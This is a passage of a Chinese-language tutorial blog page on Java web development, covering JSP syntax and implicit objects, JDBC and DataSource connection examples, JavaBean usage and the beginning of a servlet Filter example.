class="meta">%</span>@ 指令名 属性=<span class="string">"值"</span><span class="meta">%</span>&gt;</span><br></pre></td></tr></table></figure><ol><li>page 指令</li></ol><p>指定所用的编程语言，与 JSP 对应的 servlet 接口，所拓展的类以及导入的软件包等</p><p>常用属性：<a href="https://www.cnblogs.com/sharpest/p/10068832.html" target="_blank" rel="noopener">https://www.cnblogs.com/sharpest/p/10068832.html</a></p><ol start="2"><li><p>include 指令<code>&lt;%@ include file=&quot;filename&quot; %&gt;</code> 包含其他文件（静态包含）</p></li><li><p><code>&lt;%@ taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot; %&gt;</code> 引入标签库的定义</p></li></ol><h3 id="3-2-JSP-声明"><a href="#3-2-JSP-声明" class="headerlink" title="3.2 JSP 声明"></a>3.2 JSP 声明</h3><p>用于声明成员变量和方法</p><p>语法：<code>&lt;%! declaration;[declaration;]……%&gt;</code></p><p>example：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! <span class="keyword">int</span> v1=<span class="number">0</span>;%&gt;</span><br><span class="line">&lt;%! String v5=<span class="string">"hello"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> v6;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%! </span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">amethod</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"> %&gt;</span><br></pre></td></tr></table></figure><h3 id="3-3-Java-程序片段（Scriptlet）"><a href="#3-3-Java-程序片段（Scriptlet）" class="headerlink" title="3.3 Java 程序片段（Scriptlet）"></a>3.3 Java 程序片段（Scriptlet）</h3><p>在 JSP 文件中，可以在 <code>&lt;%</code> 和 <code>%&gt;</code> 标记间嵌入任何有效的 Java 程序代码。</p><h3 id="3-4-JSP-表达式-EL"><a href="#3-4-JSP-表达式-EL" class="headerlink" title="3.4 JSP 表达式(EL)"></a>3.4 JSP 表达式(EL)</h3><p>传统 Java 表达式：<code>&lt;%=</code> 和 <code>%&gt;</code> 之间</p><p><a href="https://www.jb51.net/article/105314.htm" target="_blank" rel="noopener">https://www.jb51.net/article/105314.htm</a></p><h3 id="3-5-JSP-九大隐含对象"><a href="#3-5-JSP-九大隐含对象" class="headerlink" title="3.5 JSP 九大隐含对象"></a>3.5 JSP 九大隐含对象</h3><table><thead><tr><th>变量名</th><th>类型</th><th>作用</th></tr></thead><tbody><tr><td>pageContext</td><td>PageContext</td><td>当前页面共享数据，还可以获取其他8个内置对象</td></tr><tr><td>request</td><td>HttpServletRequest</td><td>客户端请求对象，包含了所有客户端请求信息</td></tr><tr><td>session</td><td>HttpSession</td><td>请求会话</td></tr><tr><td>application</td><td>ServletContext</td><td>全局对象，所有用户间共享数据</td></tr><tr><td>response</td><td>HttpServletResponse</td><td>响应对象，主要用于服务器端设置响应信息</td></tr><tr><td>page</td><td>Object</td><td>当前Servlet对象,<code>this</code></td></tr><tr><td>out</td><td>JspWriter</td><td>输出对象，数据输出到页面上</td></tr><tr><td>config</td><td>ServletConfig</td><td>Servlet的配置对象</td></tr><tr><td>exception</td><td>Throwable</td><td>异常对象</td></tr></tbody></table><h3 id="3-6-JSP-标准标签库-JSTL"><a href="#3-6-JSP-标准标签库-JSTL" class="headerlink" title="3.6 JSP 标准标签库(JSTL)"></a>3.6 JSP 标准标签库(JSTL)</h3><p>JSP标准标签库（JSTL）是一个JSP标签集合，它封装了JSP应用的通用核心功能。</p><p>JSTL支持通用的、结构化的任务，比如迭代，条件判断，XML文档操作，国际化标签，SQL标签。 除了这些，它还提供了一个框架来使用集成JSTL的自定义标签。</p><p><a href="https://www.runoob.com/jsp/jsp-jstl.html" target="_blank" rel="noopener">https://www.runoob.com/jsp/jsp-jstl.html</a></p><h2 id="4-JDBC"><a href="#4-JDBC" class="headerlink" title="4 JDBC"></a>4 JDBC</h2><p>JDBC连接数据库的一般步骤:</p><ol><li>注册驱动，<code>Class.forName(&quot;数据库驱动的类名&quot;)</code>。</li><li>获取连接，<code>DriverManager.getConnection(xxx)</code>。</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--首先导入一些必要的packages--&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*"</span>%&gt;</span><br><span class="line">&lt;!--告诉编译器使用SQL包--&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.sql.*"</span>%&gt;</span><br><span class="line">&lt;!--设置中文输出--&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">"text/html; charset=GB2312"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;dbaccess.jsp&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  Connection con;</span><br><span class="line">  Statement stmt;</span><br><span class="line">  ResultSet rs;</span><br><span class="line">  <span class="comment">//加载驱动程序，下面的代码加载MySQL驱动程序</span></span><br><span class="line">  Class.forName(<span class="string">"com.mysql.jdbc.Driver"</span>);</span><br><span class="line">  <span class="comment">//注册MySQL驱动程序</span></span><br><span class="line">  DriverManager.registerDriver(<span class="keyword">new</span> com.mysql.jdbc.Driver());</span><br><span class="line">  <span class="comment">//用适当的驱动程序连接到数据库</span></span><br><span class="line">  String dbUrl =  <span class="string">"jdbc:mysql://localhost:3306/BookDB?useUnicode=true&amp;characterEncoding=GB2312&amp;useSSL=false"</span>;</span><br><span class="line">  String dbUser=<span class="string">"root"</span>;</span><br><span class="line">  String dbPwd=<span class="string">"root"</span>;</span><br><span class="line">  <span class="comment">//建立数据库连接</span></span><br><span class="line">  con = java.sql.DriverManager.getConnection(dbUrl,dbUser,dbPwd);</span><br><span class="line">  <span class="comment">//创建一个SQL声明</span></span><br><span class="line">  stmt = con.createStatement();</span><br><span class="line">  <span class="comment">//增加新记录</span></span><br><span class="line">  stmt.executeUpdate(<span class="string">"insert into BOOKS (ID,NAME,TITLE,PRICE) values('999','Tom','Tomcat Bible',44.5)"</span>);</span><br><span class="line">                                                       </span><br><span class="line">  <span class="comment">//查询记录</span></span><br><span class="line">  rs = stmt.executeQuery(<span class="string">"select ID,NAME,TITLE,PRICE from BOOKS"</span>);</span><br><span class="line">  <span class="comment">//输出查询结果</span></span><br><span class="line">  out.println(<span class="string">"&lt;table border=1 width=400&gt;"</span>);</span><br><span class="line">  <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">    String col1 = rs.getString(<span class="number">1</span>);</span><br><span class="line">    String col2 = rs.getString(<span class="number">2</span>);</span><br><span class="line">    String col3 = rs.getString(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">float</span> col4 = rs.getFloat(<span class="number">4</span>);</span><br><span class="line">    <span class="comment">//打印所显示的数据</span></span><br><span class="line">    out.println(<span class="string">"&lt;tr&gt;&lt;td&gt;"</span>+col1+<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>+col2+<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>+col3+<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>+col4+<span class="string">"&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  out.println(<span class="string">"&lt;/table&gt;"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//删除新增加的记录</span></span><br><span class="line">  stmt.executeUpdate(<span class="string">"delete from BOOKS where ID='999'"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//关闭数据库连接</span></span><br><span class="line">  rs.close();</span><br><span class="line">  stmt.close();</span><br><span class="line">  con.close();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//注销 JDBC Driver</span></span><br><span class="line">  Enumeration&lt;Driver&gt; drivers = DriverManager.getDrivers();</span><br><span class="line">  <span class="keyword">while</span>(drivers.hasMoreElements()) &#123;</span><br><span class="line">    DriverManager.deregisterDriver(drivers.nextElement());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;out.println(e.getMessage());&#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="4-1-数据源（DataSource）"><a href="#4-1-数据源（DataSource）" class="headerlink" title="4.1 数据源（DataSource）"></a>4.1 数据源（DataSource）</h3><p>在真实的Java项目中通常不会使用原生的<code>JDBC</code>的<code>DriverManager</code>去连接数据库，而是使用数据源(<code>javax.sql.DataSource</code>)来代替<code>DriverManager</code>管理数据库的连接。一般情况下在Web服务启动时候会预先定义好数据源，有了数据源程序就不再需要编写任何数据库连接相关的代码了，直接引用<code>DataSource</code>对象即可获取数据库连接了。</p><p>在  <code>META-INF</code> 目录下创建一个 <code>content.xml</code> 文件，在里面定义数据源</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span>  <span class="attr">reloadable</span>=<span class="string">"true"</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Resource</span> <span class="attr">name</span>=<span class="string">"jdbc/BookDB"</span> <span class="attr">auth</span>=<span class="string">"Container"</span> <span class="attr">type</span>=<span class="string">"javax.sql.DataSource"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">maxActive</span>=<span class="string">"100"</span> <span class="attr">maxIdle</span>=<span class="string">"30"</span> <span class="attr">maxWait</span>=<span class="string">"10000"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">username</span>=<span class="string">"root"</span> <span class="attr">password</span>=<span class="string">"root"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">driverClassName</span>=<span class="string">"com.mysql.jdbc.Driver"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">url</span>=<span class="string">"jdbc:mysql://localhost:3306/BookDB?autoReconnect=true<span class="symbol">&amp;amp;</span>useUnicode=true<span class="symbol">&amp;amp;</span>characterEncoding=GB2312<span class="symbol">&amp;amp;</span>useSSL=false"</span>/&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">Context</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>web.xml</code> 中加入 <code>&lt;resource-ref&gt;</code> 元素</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resource-ref</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>DB Connection<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">res-ref-name</span>&gt;</span>jdbc/BookDB<span class="tag">&lt;/<span class="name">res-ref-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">res-type</span>&gt;</span>javax.sql.DataSource<span class="tag">&lt;/<span class="name">res-type</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">res-auth</span>&gt;</span>Container<span class="tag">&lt;/<span class="name">res-auth</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resource-ref</span>&gt;</span></span><br></pre></td></tr></table></figure><p>获取 jdbc/BookDB 数据源引用，并获取连接对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Connection con;</span><br><span class="line"></span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">DataSource ds =(DataSource)ctx.lookup(<span class="string">"java:comp/env/jdbc/BookDB"</span>);</span><br><span class="line">con = ds.getConnection();</span><br></pre></td></tr></table></figure><p>example</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--首先导入一些必要的包--&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.sql.*"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.sql.*"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.naming.*"</span>%&gt;</span><br><span class="line">&lt;!--设置中文输出--&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">"text/html; charset=GB2312"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;TITLE&gt;dbaccess1.jsp&lt;/TITLE&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  Connection con;</span><br><span class="line">  Statement stmt;</span><br><span class="line">  ResultSet rs;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">//建立数据库连接</span></span><br><span class="line">  Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">  DataSource ds =(DataSource)ctx.lookup(<span class="string">"java:comp/env/jdbc/BookDB"</span>);</span><br><span class="line">  con = ds.getConnection();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//创建一个SQL声明</span></span><br><span class="line">  stmt = con.createStatement();</span><br><span class="line">  <span class="comment">//增加新记录</span></span><br><span class="line">  stmt.executeUpdate(<span class="string">"insert into BOOKS(ID,NAME,TITLE,PRICE) values ('999','Tom','Tomcat Bible',44.5)"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//查询记录</span></span><br><span class="line">  rs = stmt.executeQuery(<span class="string">"select ID,NAME,TITLE,PRICE from BOOKS"</span>);</span><br><span class="line">  <span class="comment">//输出查询结果</span></span><br><span class="line">  out.println(<span class="string">"&lt;table border=1 width=400&gt;"</span>);</span><br><span class="line">  <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">    String col1 = rs.getString(<span class="number">1</span>);</span><br><span class="line">    String col2 = rs.getString(<span class="number">2</span>);</span><br><span class="line">    String col3 = rs.getString(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">float</span> col4 = rs.getFloat(<span class="number">4</span>);</span><br><span class="line">    </span><br><span class="line">     <span class="comment">//打印所显示的数据</span></span><br><span class="line">    out.println(<span class="string">"&lt;tr&gt;&lt;td&gt;"</span>+col1+<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>+col2+<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>+col3+<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>+col4+<span class="string">"&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  out.println(<span class="string">"&lt;/table&gt;"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//删除新增加的记录</span></span><br><span class="line">  stmt.executeUpdate(<span class="string">"delete from BOOKS where ID='999'"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//关闭结果集、SQL声明、数据库连接</span></span><br><span class="line">  rs.close();</span><br><span class="line">  stmt.close();</span><br><span class="line">  con.close();</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e) &#123;out.println(e.getMessage());e.printStackTrace();&#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="5-JavaBean"><a href="#5-JavaBean" class="headerlink" title="5 JavaBean"></a>5 JavaBean</h2><p>JavaBean 是特殊的 Java 类，使用 Java 语言书写，并且遵守 JavaBean API 规范，是一种可重复使用、且跨平台的软件组件。</p><ul><li>提供一个默认的无参构造函数。</li><li>需要被序列化并且实现了 Serializable 接口。</li><li>可能有一系列可读写属性。</li><li>可能有一系列的 getter 或 <strong>setter</strong> 方法。</li></ul><p>JavaBean 示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> mypack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentsBean</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">private</span> String firstName = <span class="keyword">null</span>;</span><br><span class="line">   <span class="keyword">private</span> String lastName = <span class="keyword">null</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">int</span> age = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">StudentsBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getFirstName</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> firstName;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getLastName</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> lastName;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> age;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFirstName</span><span class="params">(String firstName)</span></span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.firstName = firstName;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLastName</span><span class="params">(String lastName)</span></span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.lastName = lastName;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.age = age;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后的 .class 文件存放在 <code>/WEB_INF/classes/mypack/</code> 中</p><ol><li>导入 JavaBean 类</li></ol><p>要想访问，首先需要导入：<code>&lt;%@ page import=&quot;mypack.StudentsBean&quot;%&gt;</code></p><ol start="2"><li>声明 JavaBean 对象</li></ol><p>使用 <code>&lt;jsp:useBean&gt;</code> 来声明：<code>&lt;jsp:useBean id=&quot;myBean&quot; class=&quot;mypack.StudentsBean&quot; scope=&quot;session&quot;/&gt;</code></p><p><code>&lt;jsp:useBean&gt;</code> 属性：</p><ul><li><p>id: 命名引用该Bean的变量。如果能够找到id和scope相同的Bean实例，jsp:useBean动作将使用已有的Bean实例而不是创建新的实例。</p></li><li><p>class: 指定Bean的完整包名</p></li><li><p>scope: 指定Bean在哪种上下文内可用，可以取下面的四个值之一：page，request，session和application</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 默认值是page，表示该Bean只在当前页面内可用（保存在当前页面的PageContext内）。 </span><br><span class="line"><span class="number">2.</span> request表示该Bean在当前的客户请求内有效（保存在ServletRequest对象内）。 </span><br><span class="line"><span class="number">3.</span> session表示该Bean对当前HttpSession内的所有页面都有效。 </span><br><span class="line"><span class="number">4.</span> application则表示该Bean对所有具有相同ServletContext的页面都有效。</span><br></pre></td></tr></table></figure></li><li><p>type: 指定引用该对象的变量的类型，它必须是Bean类的名字、超类名字、该类所实现的接口名字之一。请记住变量的名字是由id属性指定的。  </p><p>beanName: 指定Bean的名字。如果提供了type属性和beanName属性，允许省略class属性。</p></li></ul><ol start="3"><li>访问 JavaBean 属性</li></ol><p>1）使用 <code>&lt;jsp:getProperty&gt;</code> 标签</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:getProperty name=<span class="string">"myBean"</span> property=<span class="string">"count"</span> /&gt;</span><br></pre></td></tr></table></figure><p>2）Java表达式</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=myBean.getCount() %&gt;</span><br></pre></td></tr></table></figure><p>3）EL 表达式</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;myBean.count&#125;</span><br></pre></td></tr></table></figure><p>给 JavaBean 属性赋值：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:setProperty name=<span class="string">"myBean"</span> property=<span class="string">"count"</span> value=<span class="string">"1"</span>/&gt;</span><br><span class="line">或</span><br><span class="line">&lt;% myBean.setCount(<span class="number">1</span>);%&gt;</span><br></pre></td></tr></table></figure><h2 id="6-Filter"><a href="#6-Filter" class="headerlink" title="6 Filter"></a>6 Filter</h2><p><code>javax.servlet.Filter</code>是<code>Servlet2.3</code>新增的一个特性,主要用于过滤URL请求，通过Filter我们可以实现URL请求资源权限验证、用户登陆检测等功能。</p><p>Filter是一个接口，实现一个Filter只需要重写<code>init</code>、<code>doFilter</code>、<code>destroy</code>方法即可，其中过滤逻辑都在<code>doFilter</code>方法中实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> mypack;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">@WebFilter( //用@WebFilter标注配置NoteFilter</span></span><br><span class="line"><span class="comment">filterName = "NoteFilter", </span></span><br><span class="line"><span class="comment">urlPatterns = "/note", </span></span><br><span class="line"><span class="comment">initParams = &#123;</span></span><br><span class="line"><span class="comment">@WebInitParam(name = "ipblock", value = "221.45"),</span></span><br><span class="line"><span class="comment">@WebInitParam(name = "blacklist", value = "捣蛋鬼")&#125;</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NoteFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> FilterConfig config = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">private</span> String blackList=<span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">private</span> String ipblock=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"NoteFilter: init()"</span>); </span><br><span class="line">    <span 